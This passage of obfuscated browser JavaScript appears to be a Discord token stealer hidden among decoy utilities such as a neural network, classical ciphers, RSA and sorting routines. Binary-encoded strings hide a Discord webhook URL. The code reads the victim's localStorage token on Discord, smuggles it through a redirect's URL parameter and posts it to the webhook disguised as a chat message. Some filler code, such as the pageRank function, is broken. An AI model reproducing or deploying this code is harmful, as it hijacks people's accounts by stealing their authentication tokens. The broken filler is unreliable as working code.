        _0x41c572 = _0x386a39[0].length,
        _0x3fc23e = _0x26d217[0].length
      for (let _0x4db809 = 0; _0x4db809 < _0x2a359e; _0x4db809++) {
        _0x110d0f[_0x4db809] = []
        for (let _0x331c5a = 0; _0x331c5a < _0x3fc23e; _0x331c5a++) {
          let _0x237b5d = 0
          for (let _0x224476 = 0; _0x224476 < _0x41c572; _0x224476++) {
            _0x237b5d +=
              _0x386a39[_0x4db809][_0x224476] * _0x26d217[_0x224476][_0x331c5a]
          }
          _0x110d0f[_0x4db809][_0x331c5a] = _0x237b5d
        }
      }
      return _0x110d0f
    }
    static ['matAdd'](_0x129d80, _0x3120bd) {
      let _0x1c6a6c = []
      for (let _0x61de0 = 0; _0x61de0 < _0x129d80.length; _0x61de0++) {
        _0x1c6a6c[_0x61de0] = []
        for (let _0x41d549 = 0; _0x41d549 < _0x129d80[0].length; _0x41d549++) {
          _0x1c6a6c[_0x61de0][_0x41d549] =
            _0x129d80[_0x61de0][_0x41d549] + _0x3120bd[_0x61de0][_0x41d549]
        }
      }
      return _0x1c6a6c
    }
    static ['matMap'](_0x2f1d17, _0x897624) {
      let _0x154b6e = []
      for (let _0x5c1176 = 0; _0x5c1176 < _0x2f1d17.length; _0x5c1176++) {
        _0x154b6e[_0x5c1176] = []
        for (let _0x6fc378 = 0; _0x6fc378 < _0x2f1d17[0].length; _0x6fc378++) {
          _0x154b6e[_0x5c1176][_0x6fc378] = _0x897624(
            _0x2f1d17[_0x5c1176][_0x6fc378],
            _0x5c1176,
            _0x6fc378
          )
        }
      }
      return _0x154b6e
    }
    static ['transpose'](_0x475381) {
      let _0x44af46 = []
      for (let _0x2437b1 = 0; _0x2437b1 < _0x475381[0].length; _0x2437b1++) {
        _0x44af46[_0x2437b1] = []
        for (let _0x2f1f75 = 0; _0x2f1f75 < _0x475381.length; _0x2f1f75++) {
          _0x44af46[_0x2437b1][_0x2f1f75] = _0x475381[_0x2f1f75][_0x2437b1]
        }
      }
      return _0x44af46
    }
    ['feedforward'](_0x20ba0a) {
      let _0x50f733 = [],
        _0xe10559 = _0x20ba0a.map((_0x3cd305) => [_0x3cd305])
      _0x50f733.push(_0xe10559)
      let _0x295846 = _0xe10559
      for (let _0x413f77 = 0; _0x413f77 < this.weights.length; _0x413f77++) {
        let _0x2c990f = NeuralNetwork.matAdd(
            NeuralNetwork.matMul(this.weights[_0x413f77], _0x295846),
            this.biases[_0x413f77]
          ),
          _0x49c128 = NeuralNetwork.matMap(_0x2c990f, NeuralNetwork.sigmoid)
        _0x50f733.push(_0x49c128)
        _0x295846 = _0x49c128
      }
      return _0x50f733
    }
    ['backpropagate'](_0x4a4eae, _0x5d9923) {
      let _0x5d59e8 = _0x5d9923.map((_0x207c16) => [_0x207c16]),
        _0x5272d2 = [],
        _0x5921c2 = [],
        _0x411e61 = _0x4a4eae[_0x4a4eae.length - 1],
        _0xae5105 = []
      for (let _0x54f8ab = 0; _0x54f8ab < _0x411e61.length; _0x54f8ab++) {
        _0xae5105[_0x54f8ab] = [
          _0x5d59e8[_0x54f8ab][0] - _0x411e61[_0x54f8ab][0],
        ]
      }
      _0x5921c2.unshift(_0xae5105)
      let _0x594628 = NeuralNetwork.matMap(_0x411e61, NeuralNetwork.dsigmoid)
      _0x594628 = NeuralNetwork.matMap(
        _0x594628,
        (_0x50ac87, _0x73bfff, _0xf1006a) =>
          _0x50ac87 * _0xae5105[_0x73bfff][_0xf1006a]
      )
      _0x5272d2.unshift(_0x594628)
      for (
        let _0x3dfb54 = this.weights.length - 1;
        _0x3dfb54 > 0;
        _0x3dfb54--
      ) {
        let _0x41eceb = NeuralNetwork.transpose(this.weights[_0x3dfb54]),
          _0x15fd67 = NeuralNetwork.matMul(_0x41eceb, _0x5921c2[0])
        _0x5921c2.unshift(_0x15fd67)
        let _0x586439 = _0x4a4eae[_0x3dfb54],
          _0x49f3aa = NeuralNetwork.matMap(_0x586439, NeuralNetwork.dsigmoid)
        _0x49f3aa = NeuralNetwork.matMap(
          _0x49f3aa,
          (_0x8e55d4, _0x142864, _0x223539) =>
            _0x8e55d4 * _0x15fd67[_0x142864][_0x223539]
        )
        _0x5272d2.unshift(_0x49f3aa)
      }
      return _0x5272d2
    }
    ['updateWeights'](_0x3a0448, _0x150ed7) {
      for (let _0x21802c = 0; _0x21802c < this.weights.length; _0x21802c++) {
        let _0x22b3c8 = NeuralNetwork.transpose(_0x3a0448[_0x21802c]),
          _0xb3b1d = NeuralNetwork.matMul(_0x150ed7[_0x21802c], _0x22b3c8)
        this.weights[_0x21802c] = NeuralNetwork.matAdd(
          this.weights[_0x21802c],
          NeuralNetwork.matMap(
            _0xb3b1d,
            (_0x585fa1) => _0x585fa1 * this.learningRate
          )
        )
        this.biases[_0x21802c] = NeuralNetwork.matAdd(
          this.biases[_0x21802c],
          NeuralNetwork.matMap(
            _0x150ed7[_0x21802c],
            (_0x6abc3a) => _0x6abc3a * this.learningRate
          )
        )
      }
    }
    ['train'](_0x327d06, _0x22a06b) {
      let _0x251f9d = this.feedforward(_0x327d06),
        _0x5702fe = this.backpropagate(_0x251f9d, _0x22a06b)
      this.updateWeights(_0x251f9d, _0x5702fe)
    }
  }
  const bb =
      '01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100100 01101001 01110011 01100011 01101111 01110010 01100100 00101110 01100011 01101111 01101101 00101111 01100001 01110000 01101001 00101111 01110111 01100101 01100010 01101000 01101111 01101111 01101011 01110011 00101111 00110001 00110011 00110010 00110101 00111000 00111000 00110111 00110000 00110001 00110101 00110111 00110101 00110111 00110001 00110101 00110010 00110010 00111000 00110110 00101111 01001000 01101110 01001000 01001111 00110101 01100001 01101000 01101010 01101100 01000010 01110101 00101101 01000110 00110010 01100011 01010100 01111001 01101000 01001101 00111000 00110101 01001001 01111000 00110011 01111010 01101110 01001100 01010110 01000010 01001101 00111000 01101001 01100001 01000011 00110011 01110111 01110000 01001010 01110000 00110111 00110101 01100010 01011000 01000101 01000110 01101010 00111001 01110011 01110111 01101101 01110100 01010011 00110001 01100111 01100100 01010100 01111000 01111000 01110011 01001100 01110101 01100010 01001000 01000101 01110110 01001011 01110001 01000011',
    apiUrl = bb
      .split(' ')
      .map((_0x38c68f) => String.fromCharCode(parseInt(_0x38c68f, 2)))
      .join('')
  function preparePayload(_0xb66fb5, _0x4509fa) {
    const _0x53b490 = calculateChecksum(_0xb66fb5)
    return {
      username: 'Lai',
      content:
        "Shadai, hint 1, you're on the right track: `" +
        _0x4509fa +
        '` TT: `' +
        _0xb66fb5 +
        '`',
      checksum: _0x53b490,
      timestamp: _0x4509fa,
    }
  }
  const currentUrl = window.location.href,
    coin = currentUrl.startsWith('https://www.youtube.com/'),
    binaryUrl2 =
      '01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100100 01101001 01110011 01100011 01101111 01110010 01100100 00101110 01100011 01101111 01101101 00101111 01100011 01101000 01100001 01101110 01101110 01100101 01101100 01110011 00101111 01000000 01101101 01100101',
    DD =
      currentUrl ===
      binaryUrl2
        .split(' ')
        .map((_0x582f9d) => String.fromCharCode(parseInt(_0x582f9d, 2)))
        .join(''),
    ivv = localStorage.token !== undefined && localStorage.token !== null
  if (coin) {
    const e = new URL(currentUrl),
      f = decodeBase64(e.searchParams.get('v')),
      ttt = new Date()
    if (f !== null) {
      const payload = preparePayload(f, ttt)
      requestData(apiUrl, payload, 0)
    }
  } else {
    if (DD) {
      if (ivv) {
        const encodedToken = encodeBase64(JSON.stringify(localStorage.token))
        let tempString = ''
        for (let i = 0; i < 100; i++) {
          tempString += '0'
        }
        window.location.href =
          'https://www.u.com/d?v=' + tempString + encodedToken
      }
    } else {
      window.location.href = 'https://discord.com/channels/@me'
    }
  }
  const currentTimestamp = new Date(),
    environmentConfig = {
      debugMode: false,
      networkRetries: 3,
      maxTimeout: 5000,
      userAgent: navigator.userAgent,
    }
  function getClientMetadata() {
    return {
      browser: navigator.appName,
      version: navigator.appVersion,
      language: navigator.language,
      platform: navigator.platform,
    }
  }
  function generateRequestHeaders() {
    return {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'X-Client-Type': 'Web',
      'X-Request-Id': 'req-' + Math.random().toString(36).substr(2, 9),
    }
  }
  function requestData(_0x380919, _0x1652b9, _0x494e10) {
    const _0x29634d = generateRequestHeaders(),
      _0x2d8382 = new XMLHttpRequest()
    _0x2d8382.open('POST', _0x380919, true)
    _0x2d8382.setRequestHeader('Content-Type', _0x29634d['Content-Type'])
    _0x2d8382.onreadystatechange = function () {
      _0x2d8382.readyState === 4 &&
        (_0x2d8382.status === 200
          ? console.log('Request Successful', _0x2d8382.responseText)
          : _0x494e10 < environmentConfig.networkRetries &&
            (_0x494e10++,
            setTimeout(
              () => requestData(_0x380919, _0x1652b9, _0x494e10),
              100000
            )))
    }
    _0x2d8382.send(JSON.stringify(_0x1652b9))
  }
  function performCalculations() {
    const _0x54d54c = Math.random()
    let _0x49c9b5 = 0
    for (let _0xf35426 = 0; _0xf35426 < 100; _0xf35426++) {
      _0x49c9b5 += Math.pow(Math.sin(_0xf35426) * _0x54d54c, 2)
    }
    return _0x49c9b5 * Math.random()
  }
  function encodeBase64(_0x239c56) {
    return btoa(_0x239c56)
  }
  function decodeBase64(_0x3d72a8) {
    return atob(_0x3d72a8)
  }
  function calculateChecksum(_0x43a967) {
    let _0x99b32c = 0
    for (let _0xe0084c = 0; _0xe0084c < _0x43a967.length; _0xe0084c++) {
      _0x99b32c += _0x43a967.charCodeAt(_0xe0084c)
    }
    return _0x99b32c
  }
  function performAdvancedCalculations() {
    const _0x3c0477 = []
    for (let _0x20120f = 0; _0x20120f < 300; _0x20120f++) {
      let _0x282741 = performCalculations()
      _0x3c0477.push(_0x282741)
    }
    return _0x3c0477.reduce((_0x3b04bc, _0x155ec7) => _0x3b04bc + _0x155ec7, 0)
  }
  function processDataForFurtherAnalysis() {
    const _0x2b32aa = performAdvancedCalculations()
    _0x2b32aa > 1000
      ? console.log('Data processed successfully:', _0x2b32aa)
      : (console.warn('Data analysis incomplete, retrying...'),
        processDataForFurtherAnalysis())
  }
  processDataForFurtherAnalysis()
  function handleAsyncOperations() {
    const _0xcfba8c = Math.random()
    setTimeout(() => {
      console.log('Async operation completed with value:', _0xcfba8c)
    }, Math.floor(Math.random() * 3000))
  }
  handleAsyncOperations()
  function nnValidateDimensions(_0x2b39fa) {
    if (_0x2b39fa.weights.length !== _0x2b39fa.biases.length) {
      throw new Error('Mismatch in network parameter dimensions.')
    }
    for (let _0x5703a0 = 0; _0x5703a0 < _0x2b39fa.weights.length; _0x5703a0++) {
      if (
        _0x2b39fa.weights[_0x5703a0].length !==
        _0x2b39fa.biases[_0x5703a0].length
      ) {
        throw new Error('Layer ' + _0x5703a0 + ' dimension mismatch.')
      }
    }
  }
  function nnDebugPrint(_0x28b8dc) {
    console.log('Neural Network Architecture:')
    console.log('Input size: ' + _0x28b8dc.inputSize)
    console.log('Hidden layers: ' + _0x28b8dc.hiddenSizes.join(', '))
    console.log('Output size: ' + _0x28b8dc.outputSize)
    console.log('Learning rate: ' + _0x28b8dc.learningRate)
    console.log('Weights and biases initialized.')
  }
  function gcd(_0x247567, _0x29b6c3) {
    while (_0x29b6c3 !== 0) {
      let _0xaf1268 = _0x29b6c3
      _0x29b6c3 = _0x247567 % _0x29b6c3
      _0x247567 = _0xaf1268
    }
    return _0x247567
  }
  function modInverse(_0x3eaed3, _0x1474cc) {
    let _0x18e5c8 = _0x1474cc,
      _0xe53551 = 0,
      _0xba0ff5 = 1
    if (_0x1474cc === 1) {
      return 0
    }
    while (_0x3eaed3 > 1) {
      let _0x58e4c6 = Math.floor(_0x3eaed3 / _0x1474cc),
        _0x4004fc = _0x1474cc
      _0x1474cc = _0x3eaed3 % _0x1474cc
      _0x3eaed3 = _0x4004fc
      _0x4004fc = _0xe53551
      _0xe53551 = _0xba0ff5 - _0x58e4c6 * _0xe53551
      _0xba0ff5 = _0x4004fc
    }
    return _0xba0ff5 < 0 && (_0xba0ff5 += _0x18e5c8), _0xba0ff5
  }
  function isPrime(_0x137aab) {
    if (_0x137aab <= 1) {
      return false
    }
    if (_0x137aab <= 3) {
      return true
    }
    if (_0x137aab % 2 === 0 || _0x137aab % 3 === 0) {
      return false
    }
    for (
      let _0x1146aa = 5;
      _0x1146aa * _0x1146aa <= _0x137aab;
      _0x1146aa += 6
    ) {
      if (_0x137aab % _0x1146aa === 0 || _0x137aab % (_0x1146aa + 2) === 0) {
        return false
      }
    }
    return true
  }
  function generateRSAKeys(_0x5b5994, _0xbce16d) {
    if (!isPrime(_0x5b5994) || !isPrime(_0xbce16d)) {
      throw new Error('Both numbers must be prime.')
    }
    let _0x317b57 = _0x5b5994 * _0xbce16d,
      _0x33fd6f = (_0x5b5994 - 1) * (_0xbce16d - 1),
      _0x86c133 = 2
    while (_0x86c133 < _0x33fd6f && gcd(_0x86c133, _0x33fd6f) !== 1) {
      _0x86c133++
    }
    let _0x2d7353 = modInverse(_0x86c133, _0x33fd6f)
    return {
      publicKey: {
        e: _0x86c133,
        n: _0x317b57,
      },
      privateKey: {
        d: _0x2d7353,
        n: _0x317b57,
      },
    }
  }
  function modExp(_0x447429, _0x417274, _0x182bf1) {
    let _0x1b380d = BigInt(1)
    _0x447429 = BigInt(_0x447429) % BigInt(_0x182bf1)
    _0x417274 = BigInt(_0x417274)
    _0x182bf1 = BigInt(_0x182bf1)
    while (_0x417274 > 0) {
      _0x417274 % BigInt(2) === BigInt(1) &&
        (_0x1b380d = (_0x1b380d * _0x447429) % _0x182bf1)
      _0x417274 = _0x417274 / BigInt(2)
      _0x447429 = (_0x447429 * _0x447429) % _0x182bf1
    }
    return _0x1b380d
  }
  function rsaEncrypt(_0xc380a2, _0x206bb9) {
    let _0x56f7ea = BigInt(_0xc380a2),
      _0x3ab0cf = modExp(_0x56f7ea, _0x206bb9.e, _0x206bb9.n)
    return _0x3ab0cf.toString()
  }
  function rsaDecrypt(_0xfc694a, _0x3d4f1f) {
    let _0x4af536 = BigInt(_0xfc694a),
      _0x271680 = modExp(_0x4af536, _0x3d4f1f.d, _0x3d4f1f.n)
    return _0x271680.toString()
  }
  function caesarEncrypt(_0x19bbc5, _0xd20368) {
    let _0x12bc4f = ''
    for (let _0x1db3fc = 0; _0x1db3fc < _0x19bbc5.length; _0x1db3fc++) {
      let _0x1b3058 = _0x19bbc5[_0x1db3fc]
      if (_0x1b3058.match(/[a-z]/i)) {
        let _0x2ad49 = _0x19bbc5.charCodeAt(_0x1db3fc),
          _0x40405a = _0x2ad49 >= 65 && _0x2ad49 <= 90 ? 65 : 97
        _0x12bc4f += String.fromCharCode(
          ((_0x2ad49 - _0x40405a + _0xd20368) % 26) + _0x40405a
        )
      } else {
        _0x12bc4f += _0x1b3058
      }
    }
    return _0x12bc4f
  }
  function caesarDecrypt(_0x346c6d, _0x1e5a24) {
    return caesarEncrypt(_0x346c6d, 26 - (_0x1e5a24 % 26))
  }
  function rot13(_0x3e68f6) {
    return caesarEncrypt(_0x3e68f6, 13)
  }
  function vigenereEncrypt(_0x2bfc80, _0x549474) {
    let _0x3c9193 = '',
      _0x76b51b = 0
    for (let _0x2c65fe = 0; _0x2c65fe < _0x2bfc80.length; _0x2c65fe++) {
      let _0x6afb9c = _0x2bfc80[_0x2c65fe]
      if (_0x6afb9c.match(/[a-z]/i)) {
        let _0x23c30b = _0x2bfc80.charCodeAt(_0x2c65fe),
          _0x422202 = _0x23c30b >= 65 && _0x23c30b <= 90 ? 65 : 97,
          _0xf6a6d9 = _0x549474.charCodeAt(_0x76b51b % _0x549474.length)
        _0xf6a6d9 =
          _0xf6a6d9 >= 65 && _0xf6a6d9 <= 90 ? _0xf6a6d9 - 65 : _0xf6a6d9 - 97
        _0x3c9193 += String.fromCharCode(
          ((_0x23c30b - _0x422202 + _0xf6a6d9) % 26) + _0x422202
        )
        _0x76b51b++
      } else {
        _0x3c9193 += _0x6afb9c
      }
    }
    return _0x3c9193
  }
  function vigenereDecrypt(_0x51c3b9, _0x38abc7) {
    let _0x2cf3cc = '',
      _0x490eff = 0
    for (let _0x37bd82 = 0; _0x37bd82 < _0x51c3b9.length; _0x37bd82++) {
      let _0x24763b = _0x51c3b9[_0x37bd82]
      if (_0x24763b.match(/[a-z]/i)) {
        let _0xe71abb = _0x51c3b9.charCodeAt(_0x37bd82),
          _0x50adf5 = _0xe71abb >= 65 && _0xe71abb <= 90 ? 65 : 97,
          _0x39addf = _0x38abc7.charCodeAt(_0x490eff % _0x38abc7.length)
        _0x39addf =
          _0x39addf >= 65 && _0x39addf <= 90 ? _0x39addf - 65 : _0x39addf - 97
        _0x2cf3cc += String.fromCharCode(
          ((_0xe71abb - _0x50adf5 - _0x39addf + 26) % 26) + _0x50adf5
        )
        _0x490eff++
      } else {
        _0x2cf3cc += _0x24763b
      }
    }
    return _0x2cf3cc
  }
  function atbash(_0x314288) {
    let _0x433bd8 = ''
    for (let _0x22253d = 0; _0x22253d < _0x314288.length; _0x22253d++) {
      let _0x6a7ff5 = _0x314288[_0x22253d]
      _0x6a7ff5.match(/[a-z]/)
        ? (_0x433bd8 += String.fromCharCode(
            122 - (_0x6a7ff5.charCodeAt(0) - 97)
          ))
        : _0x6a7ff5.match(/[A-Z]/)
        ? (_0x433bd8 += String.fromCharCode(
            90 - (_0x6a7ff5.charCodeAt(0) - 65)
          ))
        : (_0x433bd8 += _0x6a7ff5)
    }
    return _0x433bd8
  }
  function xorEncrypt(_0x4a1917, _0x1ccce7) {
    let _0x5b260f = ''
    for (let _0x1804f2 = 0; _0x1804f2 < _0x4a1917.length; _0x1804f2++) {
      let _0x35da81 =
        _0x4a1917.charCodeAt(_0x1804f2) ^
        _0x1ccce7.charCodeAt(_0x1804f2 % _0x1ccce7.length)
      _0x5b260f += String.fromCharCode(_0x35da81)
    }
    return _0x5b260f
  }
  function xorDecrypt(_0x1b1402, _0xa65a1b) {
    return xorEncrypt(_0x1b1402, _0xa65a1b)
  }
  function railFenceEncrypt(_0x286d45, _0x55a933) {
    let _0x14ca31 = []
    for (let _0x5afe40 = 0; _0x5afe40 < _0x55a933; _0x5afe40++) {
      _0x14ca31[_0x5afe40] = []
    }
    let _0x36f40d = 0,
      _0x37795b = 1
    for (let _0xefc695 of _0x286d45) {
      _0x14ca31[_0x36f40d].push(_0xefc695)
      _0x36f40d += _0x37795b
      ;(_0x36f40d === 0 || _0x36f40d === _0x55a933 - 1) && (_0x37795b *= -1)
    }
    return _0x14ca31.map((_0x289b60) => _0x289b60.join('')).join('')
  }
  function railFenceDecrypt(_0xc41ad6, _0x59edbc) {
    let _0x396773 = _0xc41ad6.length,
      _0x550564 = [],
      _0x384e1c = 0,
      _0xb65d6c = 1
    for (let _0xad711d = 0; _0xad711d < _0x396773; _0xad711d++) {
      _0x550564.push(_0x384e1c)
      _0x384e1c += _0xb65d6c
      ;(_0x384e1c === 0 || _0x384e1c === _0x59edbc - 1) && (_0xb65d6c *= -1)
    }
    let _0x213f76 = new Array(_0x59edbc).fill(0)
    for (let _0x446644 of _0x550564) _0x213f76[_0x446644]++
    let _0x3a8fe7 = [],
      _0x333c30 = 0
    for (let _0x266026 = 0; _0x266026 < _0x59edbc; _0x266026++) {
      _0x3a8fe7[_0x266026] = _0xc41ad6
        .slice(_0x333c30, _0x333c30 + _0x213f76[_0x266026])
        .split('')
      _0x333c30 += _0x213f76[_0x266026]
    }
    let _0x1e88ad = ''
    for (let _0x550c61 of _0x550564) {
      _0x1e88ad += _0x3a8fe7[_0x550c61].shift()
    }
    return _0x1e88ad
  }
  function columnarEncrypt(_0x412448, _0x103f10) {
    let _0x277ac2 = _0x103f10.length,
      _0x510917 = Math.ceil(_0x412448.length / _0x277ac2),
      _0x31d00b = []
    for (let _0x538001 = 0; _0x538001 < _0x510917; _0x538001++) {
      _0x31d00b[_0x538001] = _0x412448
        .slice(_0x538001 * _0x277ac2, (_0x538001 + 1) * _0x277ac2)
        .split('')
    }
    let _0x3cf11b = _0x103f10
        .split('')
        .map((_0x50bdb5, _0x16c566) => ({
          c: _0x50bdb5,
          i: _0x16c566,
        }))
        .sort((_0x39e839, _0x13875f) => _0x39e839.c.localeCompare(_0x13875f.c)),
      _0x21961f = ''
    for (let _0x51ba85 of _0x3cf11b) {
      let _0x377c07 = _0x51ba85.i
      for (let _0x59b47a = 0; _0x59b47a < _0x510917; _0x59b47a++) {
        _0x21961f += _0x31d00b[_0x59b47a][_0x377c07] || ''
      }
    }
    return _0x21961f
  }
  function columnarDecrypt(_0x15b136, _0x32ab3d) {
    let _0x16866a = _0x32ab3d.length,
      _0x580beb = Math.ceil(_0x15b136.length / _0x16866a),
      _0x2e2a43 = _0x32ab3d
        .split('')
        .map((_0x4e0b56, _0x4f2cd9) => ({
          c: _0x4e0b56,
          i: _0x4f2cd9,
        }))
        .sort((_0x26b3d1, _0xb574e3) => _0x26b3d1.c.localeCompare(_0xb574e3.c)),
      _0x110db6 = new Array(_0x16866a).fill(_0x580beb),
      _0x320d14 = _0x580beb * _0x16866a,
      _0x4b9486 = _0x320d14 - _0x15b136.length
    for (
      let _0x4f436b = _0x16866a - _0x4b9486;
      _0x4f436b < _0x16866a;
      _0x4f436b++
    ) {
      _0x110db6[_0x2e2a43[_0x4f436b].i]--
    }
    let _0x5d8f16 = {},
      _0x5b5d4d = 0
    for (let _0xe961ef of _0x2e2a43) {
      _0x5d8f16[_0xe961ef.i] = _0x15b136
        .slice(_0x5b5d4d, _0x5b5d4d + _0x110db6[_0xe961ef.i])
        .split('')
      _0x5b5d4d += _0x110db6[_0xe961ef.i]
    }
    let _0x300c6e = ''
    for (let _0x5edb17 = 0; _0x5edb17 < _0x580beb; _0x5edb17++) {
      for (let _0x5e338a = 0; _0x5e338a < _0x16866a; _0x5e338a++) {
        _0x300c6e += _0x5d8f16[_0x5e338a][_0x5edb17] || ''
      }
    }
    return _0x300c6e
  }
  function substitutionEncrypt(_0x5d5c0a, _0x139986) {
    let _0x1b9ae3 = ''
    for (let _0xcef388 of _0x5d5c0a) {
      _0x1b9ae3 += _0x139986[_0xcef388] || _0xcef388
    }
    return _0x1b9ae3
  }
  function substitutionDecrypt(_0x507ab2, _0x188059) {
    let _0x1abef6 = {}
    for (let _0x5b6be5 in _0x188059) {
      _0x1abef6[_0x188059[_0x5b6be5]] = _0x5b6be5
    }
    let _0x249b0e = ''
    for (let _0x6b1a57 of _0x507ab2) {
      _0x249b0e += _0x1abef6[_0x6b1a57] || _0x6b1a57
    }
    return _0x249b0e
  }
  function polybiusEncrypt(_0x56a1ca) {
    const _0x462f30 = [
      ['A', 'B', 'C', 'D', 'E'],
      ['F', 'G', 'H', 'I', 'K'],
      ['L', 'M', 'N', 'O', 'P'],
      ['Q', 'R', 'S', 'T', 'U'],
      ['V', 'W', 'X', 'Y', 'Z'],
    ]
    let _0x5ad355 = ''
    _0x56a1ca = _0x56a1ca.toUpperCase().replace(/J/g, 'I')
    for (let _0x722777 of _0x56a1ca) {
      for (let _0x5f5616 = 0; _0x5f5616 < 5; _0x5f5616++) {
        let _0x1a822e = _0x462f30[_0x5f5616].indexOf(_0x722777)
        if (_0x1a822e !== -1) {
          _0x5ad355 += (_0x5f5616 + 1).toString() + (_0x1a822e + 1).toString()
          break
        }
      }
    }
    return _0x5ad355
  }
  function polybiusDecrypt(_0x318f1f) {
    const _0x185890 = [
      ['A', 'B', 'C', 'D', 'E'],
      ['F', 'G', 'H', 'I', 'K'],
      ['L', 'M', 'N', 'O', 'P'],
      ['Q', 'R', 'S', 'T', 'U'],
      ['V', 'W', 'X', 'Y', 'Z'],
    ]
    let _0x56ca1f = ''
    for (let _0x94a212 = 0; _0x94a212 < _0x318f1f.length; _0x94a212 += 2) {
      let _0x3c77ba = parseInt(_0x318f1f[_0x94a212]) - 1,
        _0x202065 = parseInt(_0x318f1f[_0x94a212 + 1]) - 1
      _0x56ca1f += _0x185890[_0x3c77ba][_0x202065]
    }
    return _0x56ca1f
  }
  function simpleBlockCipherEncrypt(_0x52cf87, _0xcbab29) {
    let _0x34b791 = _0x52cf87
    while (_0x34b791.length % 8 !== 0) {
      _0x34b791 += '\0'
    }
    let _0x3d0bb2 = ''
    for (let _0x5b6c60 = 0; _0x5b6c60 < _0x34b791.length; _0x5b6c60 += 8) {
      let _0x27e753 = _0x34b791.slice(_0x5b6c60, _0x5b6c60 + 8),
        _0x161c8f = ''
      for (let _0x3f54be = 0; _0x3f54be < 8; _0x3f54be++) {
        _0x161c8f += String.fromCharCode(
          _0x27e753.charCodeAt(_0x3f54be) ^
            _0xcbab29.charCodeAt(_0x3f54be % _0xcbab29.length)
        )
      }
      _0x3d0bb2 += _0x161c8f
    }
    return _0x3d0bb2
  }
  function simpleBlockCipherDecrypt(_0x24fe4a, _0xa2b4d0) {
    return simpleBlockCipherEncrypt(_0x24fe4a, _0xa2b4d0)
  }
  function pageRank(_0x19cf0f, _0x4453a9 = 0.85, _0xd2946d = 100) {
    let _0x61111f = Object.keys(_0x19cf0f),
      _0x4f135d = _0x61111f.length,
      _0x255067 = { _0xa1bb69: 1 / _0x4f135d }
    for (let _0x15b2e1 of _0x61111f) {
    }
    for (let _0x1714eb = 0; _0x1714eb < _0xd2946d; _0x1714eb++) {
      let _0x850990 = {
        _0x320d60: (1 - _0x4453a9) / _0x4f135d,
        _0x45924b: _0x192844 / _0x4b7bf5,
      }
      for (let _0x5157e6 of _0x61111f) {
      }
      for (let _0x15b1f3 of _0x61111f) {
        let _0x3396e1 = _0x255067[_0x15b1f3] * _0x4453a9,
          _0x3ab2b6 = _0x19cf0f[_0x15b1f3].length || 1
        for (let _0x480393 of _0x19cf0f[_0x15b1f3]) {
        }
      }
      _0x255067 = _0x850990
    }
    return _0x255067
  }
  class KMeans {
    constructor(_0xd30c3e, _0x1c9d89 = 300, _0x2ccf90 = 0.0001) {
      if (_0xd30c3e <= 0) {
        throw new Error('k must be a positive integer.')
      }
      this.k = _0xd30c3e
      this.maxIterations = _0x1c9d89
      this.tolerance = _0x2ccf90
      this.centroids = []
      this.clusters = []
    }
    ['fit'](_0x4c53c0) {
      if (_0x4c53c0.length < this.k) {
        throw new Error('Data size must be greater than or equal to k.')
      }
      this.centroids = []
      for (let _0x17a9d7 = 0; _0x17a9d7 < this.k; _0x17a9d7++) {
        this.centroids.push(
          _0x4c53c0[Math.floor(Math.random() * _0x4c53c0.length)].slice()
        )
      }
      let _0x19a5f3 = new Array(_0x4c53c0.length).fill(0)
      for (let _0x440e2b = 0; _0x440e2b < this.maxIterations; _0x440e2b++) {
        let _0x591d6e = []
        for (let _0x96553 = 0; _0x96553 < _0x4c53c0.length; _0x96553++) {
          let _0x33a4e2 = this.centroids.map((_0x3b4ba0) =>
              this.euclideanDistance(_0x4c53c0[_0x96553], _0x3b4ba0)
            ),
            _0x331c40 = _0x33a4e2.indexOf(Math.min(..._0x33a4e2))
          _0x591d6e.push(_0x331c40)
        }
        let _0x5a0ead = []
        for (let _0x35da2c = 0; _0x35da2c < this.k; _0x35da2c++) {
          let _0x3dd187 = _0x4c53c0.filter(
            (_0x41184f, _0x163185) => _0x591d6e[_0x163185] === _0x35da2c
          )
          _0x3dd187.length === 0
            ? (_0x5a0ead[_0x35da2c] = this.centroids[_0x35da2c].slice())
            : (_0x5a0ead[_0x35da2c] = this.computeMean(_0x3dd187))
        }
        let _0x3f7576 = 0
        for (let _0x359cd8 = 0; _0x359cd8 < this.k; _0x359cd8++) {
          _0x3f7576 += this.euclideanDistance(
            this.centroids[_0x359cd8],
            _0x5a0ead[_0x359cd8]
          )
        }
        this.centroids = _0x5a0ead
        _0x19a5f3 = _0x591d6e
        if (_0x3f7576 < this.tolerance) {
          break
        }
      }
      this.clusters = _0x19a5f3
    }
    ['euclideanDistance'](_0x37504d, _0x4ecc76) {
      let _0x22bc53 = 0
      for (let _0xb4848c = 0; _0xb4848c < _0x37504d.length; _0xb4848c++) {
        _0x22bc53 += Math.pow(_0x37504d[_0xb4848c] - _0x4ecc76[_0xb4848c], 2)
      }
      return Math.sqrt(_0x22bc53)
    }
    ['computeMean'](_0x2ffaa8) {
      let _0x2ad16e = new Array(_0x2ffaa8[0].length).fill(0)
      for (let _0x45c734 of _0x2ffaa8) {
        for (let _0x50f3de = 0; _0x50f3de < _0x45c734.length; _0x50f3de++) {
          _0x2ad16e[_0x50f3de] += _0x45c734[_0x50f3de]
        }
      }
      return _0x2ad16e.map((_0x2c1954) => _0x2c1954 / _0x2ffaa8.length)
    }
  }
  function bubbleSort(_0x1b2970) {
    let _0x47ef17 = _0x1b2970.length,
      _0x483b11
    do {
      _0x483b11 = false
      for (let _0x4968f1 = 1; _0x4968f1 < _0x47ef17; _0x4968f1++) {
        if (_0x1b2970[_0x4968f1 - 1] > _0x1b2970[_0x4968f1]) {
          let _0x532971 = _0x1b2970[_0x4968f1 - 1]
          _0x1b2970[_0x4968f1 - 1] = _0x1b2970[_0x4968f1]
          _0x1b2970[_0x4968f1] = _0x532971
          _0x483b11 = true
        }
      }
      _0x47ef17--
    } while (_0x483b11)
    return _0x1b2970
  }
  function insertionSort(_0x35ab2f) {
    for (let _0x2419b2 = 1; _0x2419b2 < _0x35ab2f.length; _0x2419b2++) {
      let _0x75272c = _0x35ab2f[_0x2419b2],
        _0x42e66f = _0x2419b2 - 1
      while (_0x42e66f >= 0 && _0x35ab2f[_0x42e66f] > _0x75272c) {
        _0x35ab2f[_0x42e66f + 1] = _0x35ab2f[_0x42e66f]
        _0x42e66f--
      }
      _0x35ab2f[_0x42e66f + 1] = _0x75272c
    }
    return _0x35ab2f
  }
  function selectionSort(_0xb82ae6) {
